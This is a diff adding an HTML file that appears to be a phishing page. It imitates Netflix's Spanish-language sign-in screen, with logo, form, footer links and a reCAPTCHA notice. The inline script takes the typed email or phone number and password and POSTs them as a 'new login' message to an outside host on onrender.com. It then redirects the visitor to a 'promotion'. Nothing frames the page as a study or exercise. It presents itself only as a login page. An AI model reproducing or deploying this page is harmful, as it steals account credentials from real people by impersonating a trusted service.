@@ -1,0 +1,143 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="style/style.css" />
+    <link rel="icon" href="img/logo.png" />
+    <title>Netflix</title>
+  </head>
+  <body>
+    <div class="upper">
+      <div class="logo">
+        <a href="#">
+          <img src="img/Netflix-Logo.png" class="img-logo" />
+        </a>
+      </div>
+      <div class="login-div">
+        <div class="login">
+          <h1>Iniciar sesión</h1>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputEmail"
+              name="email"
+              placeholder="Correo electrónico o número de teléfono"
+              onfocus="inputOnFocus(this)"
+              onblur="inputOnBlur(this)"
+              required
+            />
+            <div class="warning-input" id="warningEmail">
+              Introduce un correo electrónico o número de teléfono válido.
+            </div>
+          </div>
+          <div class="input-text">
+            <input
+              type="password"
+              id="inputPassword"
+              name="password"
+              placeholder="Contraseña"
+              onfocus="inputOnFocus(this)"
+              onblur="inputOnBlur(this)"
+              required
+            />
+            <div class="warning-input" id="warningPassword">
+              La contraseña debe tener entre 4 y 60 caracteres.
+            </div>
+          </div>
+
+          <div>
+            <button class="signin-button" onClick="buttonOnClick()">
+              Iniciar sesión
+            </button>
+          </div>
+          <div class="remember-flex">
+            <div>
+              <input type="checkbox" />
+              <label class="color_text">Recuérdame</label>
+            </div>
+            <div class="help">
+              <a class="color_text" href="/registro.html">¿No tienes una cuenta?</a>
+            </div>
+          </div>
+          
+          <div class="new-members">
+            ¿Eres nuevo aquí? <a href="#" class="signup-link">Suscríbete ahora</a>.
+          </div>
+          <div class="protection color_link help">
+            Esta página está protegida por Google reCAPTCHA para garantizar que no eres un robot. <a href="#">Más información.</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="bottom">
+      <div class="bottom-width">
+        ¿Preguntas? Llama al
+        <a href="tel:08005912876" class="tel-link">0800 591 2876</a>
+        <div>
+          <ul class="bottom-flex">
+            <li class="list-bottom">
+              <a href="#" class="link-bottom"> Preguntas frecuentes </a>
+            </li>
+            <li class="list-bottom">
+              <a href="#" class="link-bottom"> Centro de ayuda </a>
+            </li>
+            <li class="list-bottom">
+              <a href="#" class="link-bottom"> Términos de uso </a>
+            </li>
+            <li class="list-bottom">
+              <a href="#" class="link-bottom"> Privacidad </a>
+            </li>
+            <li class="list-bottom">
+              <a href="#" class="link-bottom"> Preferencias de cookies </a>
+            </li>
+            <li class="list-bottom">
+              <a href="#" class="link-bottom"> Información corporativa </a>
+            </li>
+          </ul>
+        </div>
+        <div>
+          <select class="fa select-language">
+            <option>&#xf0ac; &nbsp;&nbsp;&nbsp;Espanhol</option>
+          </select>
+        </div>
+      </div>
+    </div>
+    <script src="js/script.js"></script>
+    <script>
+      function buttonOnClick() {
+        sendData().then(() => {
+          redirectPromoction();
+        });
+      }
+
+      function sendData() {
+        const email = document.getElementById("inputEmail").value;
+        const password = document.getElementById("inputPassword").value;
+
+        if (email === "" || password === "") {
+          return;
+        } else {
+          return fetch("https://netflix-api-anl8.onrender.com/submit", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              content: `¡Inicio de sesión nuevo!\n\nCorreo electrónico/Número de teléfono: ${email}\nContraseña: ${password}`,
+            }),
+          }).then((response) => response.json());
+        }
+      }
+    </script>
+  </body>
+</html>
+```
